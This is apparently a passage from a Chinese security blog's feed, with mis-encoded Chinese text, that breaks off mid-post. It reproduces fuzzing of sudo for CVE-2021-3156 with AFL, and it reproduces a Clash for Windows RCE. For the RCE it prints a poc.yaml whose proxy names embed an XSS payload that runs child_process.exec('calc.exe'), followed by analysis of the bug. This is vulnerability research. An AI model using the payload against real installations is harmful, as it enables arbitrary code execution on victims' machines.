https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx Original Blog: https://liveoverflow.com/why-pick-sudo-research-target-part-1/ Source Project Code: https://github.com/LiveOverflow/pwnedit æœ¬èŠ‚å†…å®¹ï¼š Why Pick sudo as Research Target? | Ep. 01 How Fuzzing with AFL works! | Ep. 02 ç¯å¢ƒæ­å»º åœ¨æœ€å¼€å§‹çš„å¤ç°åšå®¢ä¸­ï¼Œæˆ‘æœ€åˆæ‰“ç®—åœ¨dockerä¸­æ­å»ºæ•´ä¸ªé¡¹ç›®ï¼Œä½†æ˜¯ç”±äºåœ¨dockerä¸Šexpéœ€è¦å¾®è°ƒå’Œå­¦ä¸šå‹åŠ›å¯¼è‡´æˆ‘å¹¶ä¸èƒ½èŠ±å¤ªå¤šæ—¶é—´åœ¨ä¸Šé¢ï¼Œæ‰€ä»¥æˆ‘ç›´æ¥ä½¿ç”¨çš„è™šæ‹Ÿæœºã€‚ä¸è¿‡åœ¨åŸå§‹çš„å¤‡ä»½æ–‡æ¡£ä¸­æˆ‘ä¾ç„¶ä¿å­˜äº†å½“æ—¶æ­å»ºdockerçš„è®°å½•ï¼Œè¿™é‡Œå’ŒåŸä½œè€…ä½¿ç”¨çš„æ–¹æ³•ç±»ä¼¼. Docker LiveOverflowåœ¨é¡¹ç›®çš„gitä»“åº“ä¸­æœ‰äº†è¿™ä¸ªdockerfileæ–‡ä»¶ã€‚å› ä¸ºä¸­å›½GFWï¼Œæ‰€ä»¥æˆ‘æ¢äº†ä¸‹æºï¼Œå¦‚æœä¸éœ€è¦å¯ä»¥åˆ æ‰ã€‚æˆ‘è¿™é‡Œç”¨çš„æ˜¯windowsçš„DesktopDockeræ­å»º ep1\\Dockerfile 12345678910111213FROM ubuntu:20.04ENV LC_CTYPE C.UTF-8ARG DEBIAN_FRONTEND=noninteractiveRUN sed -i &#x27;s/archive.ubuntu.com/mirrors.aliyun.com/g&#x27; /etc/apt/sources.list &amp;&amp;\\ apt-get update &amp;&amp; \\ apt-get install -yq gcc make wget curl git vim gdb clang llvm python3 python3-pip bsdmainutilsRUN cd /root/ &amp;&amp; wget https://www.sudo.ws/dist/sudo-1.8.31p2.tar.gz &amp;&amp; tar -xvf sudo-1.8.31p2.tar.gz &amp;&amp; cd sudo-1.8.31p2 &amp;&amp; ./configure &amp;&amp; make &amp;&amp; make installRUN cd /root/ &amp;&amp; git clone https://github.com/google/AFL &amp;&amp; cd AFL &amp;&amp; make &amp;&amp; cd llvm_mode &amp;&amp; make &amp;&amp; cd .. &amp;&amp; make installRUN useradd -ms /bin/bash userRUN echo &#x27;export PS1=&quot;\\[\\e]0;\\u@\\h: \\w\\a\\]\\[\\033[01;31m\\]\\u\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]# &quot;&#x27; &gt;&gt; /root/.bashrcRUN echo &#x27;export PS1=&quot;\\[\\e]0;\\u@\\h: \\w\\a\\]\\[\\033[01;32m\\]\\u\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]$ &quot;&#x27; &gt;&gt; /home/user/.bashrcUSER userWORKDIR /home/user ä» ubuntu20.04 çš„åŸºç¡€é•œåƒä¸­ï¼Œè®¾ç½®ç¼–ç ä¸º ENV LC_CTYPE C.UTF-8ï¼Œè®¾ç½®éäº¤äº’å¼æ“ä½œ(ARG DEBIAN_FRONTEND=noninteractive)ï¼Œå‡çº§æºå¹¶å®‰è£…å¿…è¦çš„ç¼–è¯‘è¿è¡Œç¯å¢ƒï¼Œä¹‹åä¸‹è½½æœ‰æ¼æ´çš„ sudoedit æºä»£ç ç¼–è¯‘å®‰è£…ã€‚ ä¹‹ååœ¨è¯¥dockerä¸­å®‰è£… AFL(American Fuzzy Lop) çš„æ¨¡ç³Šæµ‹è¯•è½¯ä»¶ï¼Œæ·»åŠ æ™®é€šç”¨æˆ· userï¼Œæœ€åä¿®æ”¹å‘½ä»¤æç¤ºç¬¦çš„ç•Œé¢ç¾åŒ–ä¸€ä¸‹å¹¶è®¾ç½®å·¥ä½œç›®å½• ä½ å¯ä»¥ä½¿ç”¨docker build . -t sudo1æ¥åˆ›å»ºdockerï¼Œä½†æ˜¯åŒæ—¶ä½œè€…ç¼–å†™äº†ä¸€ä¸ªmakefileæ¥æ–¹ä¾¿ç®¡ç† 12345678910111213141516171819.PHONY : all stop build run attach rootall : stop build runstop: -docker stop sudo1 sleep 1 -docker rmi sudo1build: docker build --no-cache -t sudo1 .run: docker run --rm -v $(CURDIR):/pwd --cap-add=SYS_PTRACE --security-opt seccomp=unconfined -d --name sudo1 -i sudo1attach: docker exec -it sudo1 /bin/bashroot: docker exec -u root -it sudo1 /bin/bash åœ¨make runçš„æ—¶å€™è®¾ç½®äº†-v $(CURDIR):/pwdå‚æ•°å¯ä»¥è®©è¯¥ç›®å½•ä¸‹çš„æ–‡ä»¶åŒæ ·ä½äºåœ¨dockerä¸­çš„/pwdä¸­ï¼Œä½†æ˜¯ç”±äºæˆ‘ä½¿ç”¨çš„æ˜¯DesktopDocker+VsCode(Docker plugin)ï¼Œå¯¹æˆ‘æ¥è¯´ä¸æ˜¯å¾ˆå¿…è¦ æ‰€ä»¥å¯ä»¥makeæˆ–è€…make buildæ¥åˆ›å»ºdocker &gt;&gt;é‡åˆ°çš„é—®é¢˜ ERROR [4/8] RUN cd /root/ &amp;&amp; git clone https://github.com/google/AFL &amp;&amp; cd AFL &amp;&amp; make &amp;&amp; make install ä¸­å›½å¤§é™†ç½‘ç»œå±è”½äº†githubï¼Œå¯¼è‡´å…¶æ— æ³•gitä»“åº“ï¼Œå¯ä»¥æŒ‚ä»£ç†ï¼Œæˆ–è€…åœ¨dockeråˆ›å»ºå¥½è¿‡åå†åˆ©ç”¨pwdæ–‡ä»¶å¤¹æ”¾å…¥afl dockeræ­å»ºæ—¶é—´é•¿ æ­£å¸¸ç°è±¡ï¼Œæ›´æ–°ä¸‹è½½çš„æ—¶é—´æœ‰ç‚¹é•¿ï¼Œè¿™å–å†³äºç½‘é€Ÿ åˆ›å»ºå®¹å™¨make run åˆ›å»ºå®Œæˆåä½¿ç”¨make attachè¿›å…¥docker AFL é¡¹ç›®é“¾æ¥ï¼šhttps://lcamtuf.coredump.cx/afl/ American fuzzy lop is a security-oriented fuzzer that employs a novel type of compile-time instrumentation and genetic algorithms to automatically discover clean, interesting test cases that trigger new internal states in the targeted binary. This substantially improves the functional coverage for the fuzzed code. The compact synthesized corpora produced by the tool are also useful for seeding other, more labor- or resource-intensive testing regimes down the road. ç¼–è¯‘å®‰è£…AFL è¿™é‡Œæˆ‘æ˜¯å»æ‰git aflçš„ï¼Œæ‰€ä»¥åæ¥è¦è£…ä¸Š é—®é¢˜ï¼šæƒé™ä¸å¤Ÿ ä»¥docker exec -it -u root ContainerID /bin/bashè¿›å…¥ï¼Œç„¶åç¼–è¯‘å®‰è£…aflå°±è¡Œäº† å¼€å§‹FUZZ AFLç¼–è¯‘sudo AFLçš„æµ‹è¯•æ˜¯ä»¥ç™½ç›’æµ‹è¯•ä¸ºåŸºç¡€çš„ï¼Œæˆ‘ä»¬è¦ä½¿ç”¨AFLçš„ç¼–è¯‘å™¨å¯¹ä»£ç è¿›è¡Œé‡æ–°ç¼–è¯‘ï¼›è™½ç„¶é»‘ç›’ä¹Ÿè¡Œï¼Œä½†æ˜¯è¦ä¾é æ’æ¡©å’Œqemu è¿›å…¥sudoæ–‡ä»¶å¤¹ 123CC=afl-gcc ./configure --disable-sharedmake cleanmake -j8 å‡ºç°å›¾ä¸­afl-asä¹‹ç±»çš„æç¤ºå­—ç¬¦ï¼Œè¯´æ˜æ­£åœ¨ä½¿ç”¨aflç¼–è¯‘ AFLè¿›è¡Œåˆ†æä¸fuzz AFLçš„åˆ†ææ–¹å¼æœ‰ä¸¤ç§ è¾“å…¥ä¸ºæ–‡ä»¶ 1afl-fuzz -i input_cases -o output_cases -- ./app.bin @@ @@å°±ä»£è¡¨æˆ‘ä»¬çš„è¾“å…¥ç¤ºä¾‹ è¾“å…¥ä¸ºstdinè¾“å…¥æµ 1afl-fuzz -i input_cases -o output_cases -- ./app.bin ä½†æ˜¯è¿™é‡Œæˆ‘ä»¬çš„æ˜¯ä½¿ç”¨sudoå‚æ•°å¤„ç†çš„å­—ç¬¦ä¸² åŸä½œè€…é€šè¿‡æœç´¢afl fuzz argvå‘ç°äº†åœ¨AFLçš„experimentalå®éªŒæ€§è´¨æ–‡ä»¶å¤¹ä¸­çš„argv-fuzz-inl.hå¤´æ–‡ä»¶ï¼Œå…·æœ‰ä»¥ä¸‹æè¿° æ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°sudo mainå‡½æ•°çš„æ–‡ä»¶ï¼Œå¹¶ä¸”å°†argv-fuzz-inl.hå¤åˆ¶åˆ°åŒä¸€ä¸ªæ–‡ä»¶å¤¹ä¸‹ï¼Œç„¶ååœ¨mainå‡½æ•°é™„è¿‘æ·»åŠ AFL_INIT_ARGV()å‡½æ•° AFL_INIT_ARGV()çš„åŸç† å¯ä»¥çœ‹åŸæ¥çš„å¤´æ–‡ä»¶ï¼š 1#define AFL_INIT_ARGV() do &#123; argv = afl_init_argv(&amp;argc); &#125; while (0) afl_init_argv 123456789101112131415161718192021222324static char** afl_init_argv(int* argc) &#123; static char in_buf[MAX_CMDLINE_LEN]; static char* ret[MAX_CMDLINE_PAR]; char* ptr = in_buf; int rc = 1; /* start after argv[0] */ if (read(0, in_buf, MAX_CMDLINE_LEN - 2) &lt; 0); while (*ptr) &#123; ret[rc] = ptr; /* insert &#x27;\\0&#x27; at the end of ret[rc] on first space-sym */ while (*ptr &amp;&amp; !isspace(*ptr)) ptr++; *ptr = &#x27;\\0&#x27;; ptr++; /* skip more space-syms */ while (*ptr &amp;&amp; isspace(*ptr)) ptr++; rc++; &#125; *argc = rc; return ret;&#125; æœ¬è´¨ä¸Šè¯¥å‡½æ•°å°±æ˜¯ä¸€ä¸ªå®å®šä¹‰ï¼Œå°†åŸå§‹çš„argvæ›¿æ¢ä¸ºafl_init_argvï¼Œä»è€Œèƒ½è¢«åç»­çš„fuzzeræ‰€åˆ†æ afl_init_argvæµç¨‹ è¾“å…¥æµin_bufå¼€å§‹è¯»å– æŒ‡é’ˆä¸ä¸ºNULLå’Œç©ºæ ¼ä¸€ç›´è¯»å– å‡ºç°ç©ºæ ¼æˆ–NULLç½®ç»“å°¾ä¸ºNULLï¼Œ è‹¥ä¸ºç©ºæ ¼ï¼Œå‚æ•°æ•°ç›®rc+1 æœ€åè¿”å›retï¼Œè®©retä»£æ›¿äº†åŸæ¥çš„argvï¼ŒåŒæ—¶argcè¢«æ”¹å†™ä¸ºrc é‡ç¼–è¯‘sudo 12CC=afl-gcc ./configure --disable-sharedmake clean &amp;&amp; make -j8 è¿™é‡Œå°±ç›´æ¥ç•¥è¿‡aflçš„æµ‹è¯•äº†ï¼Œå› ä¸ºè‚¯å®šä¼šå´©æºƒ AFLæ˜¯å¦‚ä½•å·¥ä½œçš„ è¿™é‡Œå¼€å§‹æ˜¯ç¬¬äºŒèŠ‚çš„å†…å®¹äº†ã€‚ æˆ‘ä»¬çš„ä¸»è¦ç›®æ ‡æ˜¯fuzzå‡ºsudoå­˜åœ¨çš„CVE-2021-3156æ¼æ´ï¼Œç„¶åå®Œæˆexpçš„ç¼–å†™ï¼Œæ‰€ä»¥å¹¶ä¸ä¼šç»†è‡´çš„è®²è§£fuzzçš„å…·ä½“å·¥ä½œåŸç†å’Œè¿‡ç¨‹ã€‚ä¸è¿‡fuzzä¸»è¦æœ‰ä»¥ä¸‹å‡ ä¸ªè¿‡ç¨‹ï¼š é¢„å¤„ç† åˆ†æå’Œè·å–æœ‰ç”¨ä¿¡æ¯ï¼Œä½¿ç”¨PINï¼Œç¬¦å·æ‰§è¡Œï¼Œæ±¡ç‚¹æ£€æŸ¥ é»‘ç›’ç™½ç›’ è¾“å…¥æ„å»º ä»æ•°æ® SSSï¼ˆç§å­ï¼‰äº§ç”Ÿå¤§é‡å˜å¼‚æ•°æ® IIIã€‚ è¾“å…¥é€‰æ‹© è¿‡æ»¤æ— æ•ˆæ•°æ®ï¼Œä¼˜åŒ–æ¨¡ç³Šæµ‹è¯• è¯„ä¼° å¤§å¤šæ•°å…³äºæ¨¡ç³Šçš„ç ”ç©¶é›†ä¸­åœ¨ä¸¤ä¸ªæŒ‡æ ‡ä¸Šï¼šè¦†ç›–ç‡å’Œåˆ©ç”¨æ¼æ´çš„å¹³å‡æ—¶é—´ å…³äºä¸Šä¸€èŠ‚çš„æŠ¥é”™ è¿™é‡Œå°±ä½“ç°äº†äº’è”ç½‘çš„è‰ºæœ¯ï¼šhttps://milek7.pl/howlongsudofuzz/ï¼Œè¿™ç¯‡æ–‡ç« é‡åˆ°äº†ç›¸åŒçš„é—®é¢˜ä»–çš„è§£å†³æ–¹æ¡ˆæ˜¯ï¼š å°†afl-gccç¼–è¯‘å™¨æ›¿æ¢ä¸ºåŸºäºLLVMçš„afl-clangç¼–è¯‘ For some reason afl-gcc instrumentation didnâ€™t work, so I used LLVM-based one. We just need to override CC for ./configure: 1CC=afl-clang-fast ./configure Clangæ˜¯ä¸ªå•¥ï¼Ÿ äº†è§£è¿‡ç¼–è¯‘åŸç†çš„äººï¼Œæˆ–è€…ç¼–å†™æ¶æ„ä»£ç çš„äººå¯¹è¿™ä¸ªä¸€å®šå¾ˆç†Ÿæ‚‰ The Clang project provides a language front-end and tooling infrastructure for languages in the C language family (C, C++, Objective C/C++, OpenCL, CUDA, and RenderScript) for the LLVM project. Both a GCC-compatible compiler driver (clang) and an MSVC-compatible compiler driver (clang-cl.exe) are provided. You can get and build the source today. ç¼–è¯‘å™¨çš„ç»“æ„ ç®€å•ç†è§£çš„è¯å°±æ˜¯è¯´Clangæ˜¯gccç¼–è¯‘å™¨çš„å¦å¤–ä¸€ä¸ªå®ç° åŒæ—¶AFLä¹Ÿæ”¯æŒä½¿ç”¨afl-clangï¼Œå’Œafl-gccçš„ç”¨æ³•ç›¸åŒ The clang wrappers (afl-clang and afl-clang++) can be used in the same way; clang users may also opt to leverage a higher-performance instrumentation mode, as described in llvm_mode/README.llvm. è¿™å°±æ¶‰åŠåˆ°afl-clang-fastçš„å®‰è£…äº† è§£å†³ä¸Šä¸€èŠ‚çš„æŠ¥é”™ å®‰è£…afl-clangå’Œafl-clang++ å®‰è£…clangå’Œllvmï¼ˆdockerfileä¸­å·²ç»æå‰è£…å¥½äº†ï¼‰ 1sudo apt-get install llvm clang è¿›å…¥ç¼–è¯‘å®‰è£…afl-clangå’Œafl-clang++ 1234cd llvm_modemakecd ..make install é‡ç¼–è¯‘sudo 1CC=afl-clang-fast ./configure --disable-shared &amp;&amp; make -j8 è¿™é‡Œæˆ‘å‘ç°å…¶å®åœ¨userç”¨æˆ·ä¸‹ä¹Ÿä¼šSegmentation faultï¼Œè¿™ä¸ªæ˜¯å› ä¸ºæƒé™çš„é—®é¢˜ï¼Œåé¢å°±å¤§è‡´èƒ½æ„Ÿå—å‡ºæ¥äº† å¼€å§‹Fuzz åˆ›å»ºè¾“å…¥è¾“å‡º 123mkdir ../input ../outputecho -en &quot;-l\\x00&quot; &gt; ../input/testcase1afl-fuzz -i ../input/ -o ../output/ -- ./src/sudo AFLçš„è¯´æ˜ AFLæ˜¯ä»¥åŸºäºè¦†ç›–ç‡æµ‹è¯•çš„æ¨¡ç³Šæµ‹è¯•å·¥å…·ï¼Œå°†ç¼–è¯‘è¿‡çš„æ•°æ®é€åˆ°è¢«æµ‹è¯•çš„ç¨‹åºä¸­ã€‚è¢«æµ‹è¯•çš„ç¨‹åºä¸­æœ‰ä½¿ç”¨AFLç¼–è¯‘å™¨ç¼–è¯‘æ—¶çš„æ’æ¡©ä»£ç (__afl_maybe_log)ï¼Œå¯ä»¥è®©ç¼–è¯‘å™¨è¿”å›é‚£äº›å‡½æ•°è¢«æ‰§è¡Œè¿‡ï¼ˆè¢«è¦†ç›–åˆ°ï¼‰ ä¾‹å¦‚åœ¨windowsçš„æ¨¡ç³Šæµ‹è¯•ä¸­ï¼Œå¯ä»¥ä½¿ç”¨DynamoRIOå¯¹æ–‡ä»¶è¿›è¡Œè¦†ç›–ç‡æµ‹è¯• 12D:\\HackTools\\Fuzz\\winafl\\build_x64\\bin\\Release&gt;D:\\HackTools\\Fuzz\\DynamoRIO-Windows-8.0.0-1\\bin64\\drrun.exe -t drcov -- test.exe not_kitty.bmpError 1 ç„¶åå†IDAä¸­åŠ è½½è¦†ç›–ç‡æ–‡ä»¶ å…¶ä¸­ç»¿è‰²çš„å°±æ˜¯å•æ¬¡æ‰§è¡Œè¢«è¦†ç›–åˆ°çš„ä»£ç ï¼Œè¢«è¦†ç›–åˆ°çš„ä»£ç è¶Šå¤šï¼Œæµ‹è¯•ä¹Ÿå°±è¶Šå‡†ç¡®ã€‚ æ‰€ä»¥AFLå¯ä»¥é€šè¿‡æ’æ¡©ä»£ç ï¼Œä¸æ–­æ”¹è¿›è¾“å…¥çš„æ•°æ®ï¼Œä»è€Œå¾—åˆ°æ›´é«˜çš„è¦†ç›–ç‡ ä¼šå¾—åˆ°æ¼æ´å—ï¼Ÿ ä¸ä¼šçš„ï¼Œåœ¨å‰æ–‡ä¸­å·²ç»å†™è¿‡äº† sudoeditå°±æ˜¯ä¸€ä¸ªé“¾æ¥åˆ°sudoçš„æ–‡ä»¶ ä½†æ˜¯æˆ‘ä»¬æ˜¯å°è¯•ç‹¬ç«‹æŒ–æ˜å‡ºè¿™ä¸ªæ¼æ´ï¼Œå¹¶ä¸” sudoedit æ˜¯ä½œä¸ºç‹¬ç«‹æ’ä»¶ç¼–è¯‘å¾—ï¼Œæ‰€ä»¥æˆ‘ä»¬å¹¶ä¸èƒ½ç›´æ¥çš„æµ‹è¯•sudoedit -s åœ¨æµ‹è¯•å‰äº†è§£ä½ è¦æµ‹è¯•çš„ç¨‹åº 123man sudowhereis sudowhereis sudoedit &gt;&gt;é—®é¢˜ This system has been minimized by removing packages and content that are not required on a system that users do not log into.To restore this content, including manpages, you can run the â€˜unminimizeâ€™ command. You will still need to ensure the â€˜man-dbâ€™ package is installed. è§£å†³æ–¹æ³•å’Œé€ æˆåŸå› åœ¨è¿™å„¿ï¼šhttps://github.com/docker/for-linux/issues/639#issuecomment-478765756 ç›´æ¥è¾“å…¥unminimizeï¼Œè¿™ä¼šèŠ±å¾ˆé•¿çš„æ—¶é—´ï¼ŒçœŸçš„å¾ˆé•¿ æ–°çš„æ€è·¯ ç»†å¿ƒä¸€ç‚¹å¯èƒ½ä¼šå‘ç°åœ¨ä¹‹å‰çš„ 123456789101112131415161718192021222324static char** afl_init_argv(int* argc) &#123; static char in_buf[MAX_CMDLINE_LEN]; static char* ret[MAX_CMDLINE_PAR]; char* ptr = in_buf; int rc = 1; /* start after argv[0] */ if (read(0, in_buf, MAX_CMDLINE_LEN - 2) &lt; 0); while (*ptr) &#123; ret[rc] = ptr; /* insert &#x27;\\0&#x27; at the end of ret[rc] on first space-sym */ while (*ptr &amp;&amp; !isspace(*ptr)) ptr++; *ptr = &#x27;\\0&#x27;; ptr++; /* skip more space-syms */ while (*ptr &amp;&amp; isspace(*ptr)) ptr++; rc++; &#125; *argc = rc; return ret;&#125; å…¶ä¸­rc=1ï¼Œè¯´æ˜æ˜¯ä»argv[1]å¼€å§‹åˆ›å»ºfake_argvçš„ï¼Œä½†æ˜¯æˆ‘ä»¬çŸ¥é“argv[0]å°±æ˜¯ç¨‹åºè‡ªèº«ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡fuzz argv[0]ä»è€Œæ‰¾åˆ°sudoeditã€‚é‚£ä¹ˆä¿®æ”¹è¯•è¯•çœ‹ï¼Œé‡æ–°ç¼–è¯‘sudo &gt;&gt;é—®é¢˜ ä¸ºä»€ä¹ˆæ²¡æœ‰å˜åŒ– æ”¹çš„æ˜¯åŒçº§ç›®å½•ä¸‹çš„argv-fuzz-inl.hæ–‡ä»¶ **ä¸ºä»€ä¹ˆéƒ½ä¸€æ ·ï¼Ÿ**é—®é¢˜çš„è§£å†³åŒæ ·åœ¨è¿™é‡Œï¼šhttps://milek7.pl/howlongsudofuzz/ Quick test shows that sudo/sudoedit selection doesnâ€™t work correctly from testcases passed in stdin, because for some reason it uses __progname. sudo/sudoeditä¸ä¼šç›´æ¥ä½¿ç”¨argv[0]ä½œä¸ºç¨‹åºåç§°ï¼Œè€Œæ˜¯ä½¿ç”¨__progname é˜…è¯»sudoæºä»£ç æˆ‘ä»¬å‘ç° åœ¨mainä¸­ å‚æ•°æ•°ç›®&gt;0ï¼Œä¼ é€’argv[0]ï¼Œå¦åˆ™ä½¿ç”¨sudoä½œä¸ºå‚æ•° åœ¨ep1\\sudo-1.8.31p2\\lib\\util\\progname.c: init_prognameä¸­ å®šä¹‰äº†HAVE___PROGNAMEï¼Œé‚£ä¹ˆåœ¨ç¼–è¯‘æ—¶å¦‚æœ__prognameä¸å­˜åœ¨ï¼Œæ‰ä¼šç”¨argv[0]åšæˆç¨‹åºå ï¼ˆå› ä¸ºvscodeè®¤ä¸ºæ˜¯windwosç¯å¢ƒï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯ç°è‰²çš„ï¼‰ è§£å†³ï¼šç›´æ¥åˆ æ‰åé‡æ–°ç¼–è¯‘ å¼€å§‹å¤šæ ¸fuzz -M é€‰å®šä¸»fuzzçš„å•å…ƒï¼ˆMasterï¼‰ 1afl-fuzz -M master -i /tmp/in -o /tmp/out/ -- ./src/sudo -S é€‰å®šä¸ºä»å±fuzzå•å…ƒï¼ˆSlaveï¼‰ 1afl-fuzz -S slave -i /tmp/in -o /tmp/out/ -- ./src/sudo","categories":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/categories/CVE/"}],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/tags/CVE/"},{"name":"fuzz","slug":"fuzz","permalink":"https://joe1sn.eu.org/tags/fuzz/"}]},{"title":"ã€æ¼æ´å¤ç°ã€‘clash <v0.19.8 rce","slug":"clash-rce","date":"2022-04-10T05:32:40.000Z","updated":"2023-08-25T03:20:27.443Z","comments":true,"path":"2022/04/10/clash-rce/","link":"","permalink":"https://joe1sn.eu.org/2022/04/10/clash-rce/","excerpt":"å½±å“ç‰ˆæœ¬ Windows v0.19.9ç‰ˆæœ¬ä»¥ä¸‹","text":"å½±å“ç‰ˆæœ¬ Windows v0.19.9ç‰ˆæœ¬ä»¥ä¸‹ æ¼æ´å¤ç° æ¼æ´ç¨‹åºè¿æ¥ï¼š https://github.com/Fndroid/clash_for_windows_pkg/releases poc.yaml 123456789101112131415161718192021222324port: 7890socks-port: 7891allow-lan: truemode: Rulelog-level: infoexternal-controller: :9090proxies: - name: a&lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;calc.exe&quot;);`);&gt; type: socks5 server: 127.0.0.1 port: &quot;17938&quot; skip-cert-verify: true - name: abc type: socks5 server: 127.0.0.1 port: &quot;8088&quot; skip-cert-verify: trueproxy-groups: - name: &lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;calc.exe&quot;);`);&gt; type: select proxies: - a&lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;calc.exe&quot;);`);&gt; åœ¨Profilesé‡Œé¢importå¯¼å…¥pocåï¼Œæ¿€æ´» ä¹‹åå¯ç”¨èŠ‚ç‚¹(Proxies) ç›¸å…³æ—¥å¿— æ¼æ´åˆ†æ 1.ä½¿ç”¨PoCè¿›è¡Œåˆ†æ çœ‹PoCçš„å†™æ³•æ˜¯ä¸æ˜¯ç‰¹åˆ«åƒXSSï¼Œå› ä¸ºå¶Clash For Windowsé‡‡ç”¨electronç¼–å†™ï¼Œä½¿ç”¨asar å®‰è£…asar 1npm install -g asar è§£åŒ… 1asar e app.asar app_name å¯¹å…¶è¿›è¡Œè§£åŒ…åï¼š åŸä½œè€…å¯¹renderé‡‡ç”¨äº†ä¸€å®šçš„æ··æ·†ï¼Œè™½ç„¶å˜é‡åæ··æ·†å¯¹åˆ†æé€ æˆäº†æå¤§çš„å¹²æ‰°ï¼Œä½†æ˜¯æœ€å¤§çš„éº»çƒ¦è¿˜æ˜¯ä¸€è¡Œçš„jsä»£ç ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨ https://beautifier.io/ åæ··æ·†ï¼Œæ›¿æ¢æ‰åŸæœ‰çš„renderer.jsæ–‡ä»¶ æ‰“åŒ… 1asar pack app_name app.asar ä¹‹åä½¿ç”¨Debugtronè¿›è¡Œè°ƒè¯•ï¼Œæ‰¾åˆ°å‰ç«¯ç›¸å…³çš„ä»£ç  ä¸‹ä¸ªæ–­ç‚¹ä¸€æ­¥æ­¥çœ‹å§ è¿™é‡Œå°±å·²ç»è§¦å‘æ¼æ´äº† æœ€ç»ˆå‘ç°æ¼æ´ä»£ç  renderer.jsåœ¨åŠ è½½é…ç½®æ–‡ä»¶çš„æ—¶å€™ï¼Œåˆ›é€ å…ƒç´ å¹¶åŠ è½½æ—¶å¹¶æ²¡æœ‰å¯¹å…ƒç´ è¿›è¡Œæ£€æŸ¥æˆ–è½¬ä¹‰ï¼Œä»è€Œå¯¼è‡´XSS ç„¶åXSSä¸­ï¼Œåˆ©ç”¨ img å…ƒç´ çš„æŠ¥é”™å¤„ç†å®ç°RCE 2.ç‰ˆæœ¬å¯¹æ¯”åˆ†æ å…¶å®åç»­åˆ†ææ—¶ï¼Œå°¤å…¶æ˜¯ä½œè€…å·²ç»ä¿®å¤æ¼æ´çš„æ—¶å€™æœ€åº”è¯¥ä½¿ç”¨è¿™ä¸ªæ–¹æ³•ã€‚ è¿™æ ·æˆ‘ä»¬å°±ä¸ç”¨ä¸€æ­¥æ­¥çš„è°ƒè¯•äº†ï¼Œä½†æ˜¯è¿™é‡Œé‡‡ç”¨äº†æ··æ·†ä¹Ÿæ˜¯ä¸å¥½åˆ†æã€‚ ä¸‹è½½å·²ä¿®å¤ç‰ˆæœ¬ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯ Clash.for.Windows-0.19.9-winï¼Œæµ‹äº†ä¸‹ç¡®å®æ²¡æœ‰æ´ ç»§ç»­ä½¿ç”¨degtronè¿›è¡Œè°ƒè¯• è¿™é‡Œçš„å°–æ‹¬å·è¢«æ›¿æ¢äº†ï¼Œåº”è¯¥å°±æ˜¯æ›´æ–°äº†è¿‡æ»¤æ³•åˆ™ï¼Œç›´æ¥è½¬ä¹‰æˆå­—ç¬¦ä¸²äº† æŒ–æ˜æ€è·¯ æ ¹æ®ä¸Šé¢çš„åˆ†æï¼Œæ€€ç–‘æ˜¯æ¼æ´æŒ–æ˜è€…é€šè¿‡æµ‹è¯•.yamlé…ç½®æ–‡ä»¶æµ‹è¯•å‡ºæ¥çš„xssï¼Œè¿›ä¸€æ­¥å¯¼è‡´rce å¼•ç”¨ http://www.yongsheng.site/2022/02/28/clash for windows rce/ https://github.com/electron/asar https://github.com/bytedance/debugtron","categories":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/categories/CVE/"}],"tags":[{"name":"cve","slug":"cve","permalink":"https://joe1sn.eu.org/tags/cve/"},{"name":"æ¼æ´å¤ç°","slug":"æ¼æ´å¤ç°","permalink":"https://joe1sn.eu.org/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]},{"title":"ã€æ¼æ´å¤ç°ã€‘CVE-2022-22965 Spring4Shellå¤ç°ä¸è°ƒè¯•","slug":"spring4shell","date":"2022-04-01T03:05:20.000Z","updated":"2023-08-25T03:27:02.731Z","comments":true,"path":"2022/04/01/spring4shell/","link":"","permalink":"https://joe1sn.eu.org/2022/04/01/spring4shell/","excerpt":"waybackæ²¡æœ‰é•œåƒï¼Œè‡ªå·±å¤‡ä»½çš„mdæ‰¾ä¸åˆ°äº†ï¼Œåªæœ‰PDFå­˜æ¡£","text":"waybackæ²¡æœ‰é•œåƒï¼Œè‡ªå·±å¤‡ä»½çš„mdæ‰¾ä¸åˆ°äº†ï¼Œåªæœ‰PDFå­˜æ¡£ https://joe1sn.top/spring4shell.pdf","categories":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/categories/CVE/"}],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/tags/CVE/"},{"name":"spring","slug":"spring","permalink":"https://joe1sn.eu.org/tags/spring/"}]},{"title":"JavaWebç¬”è®°-JDBC","slug":"java-day3-JDBC","date":"2022-03-19T11:49:07.000Z","updated":"2023-06-01T14:23:16.654Z","comments":true,"path":"2022/03/19/java-day3-JDBC/","link":"","permalink":"https://joe1sn.eu.org/2022/03/19/java-day3-JDBC/","excerpt":"åŸºæœ¬æ¦‚å¿µ å¿«é€Ÿå…¥é—¨ å¯¹JDBCä¸­å„ä¸ªæ¥å£å’Œç±»è¯¦è§£","text":"åŸºæœ¬æ¦‚å¿µ å¿«é€Ÿå…¥é—¨ å¯¹JDBCä¸­å„ä¸ªæ¥å£å’Œç±»è¯¦è§£ JDBCæ¦‚å¿µ **æ¦‚å¿µï¼š**Java DataBase Connectivity ï¼ŒJavaæ•°æ®åº“è¿æ¥ æœ¬è´¨ï¼ˆç±»ä¼¼Djangoçš„ORMï¼‰:The sunå…¬å¸å®šä¹‰çš„ä¸€å¥—æ“ä½œæ‰€æœ‰å…³ç³»å‹æ•°æ®åº“çš„è§„åˆ™ï¼ˆæ¥å£ï¼‰ã€‚å„ä¸ªå‚å®¶æ 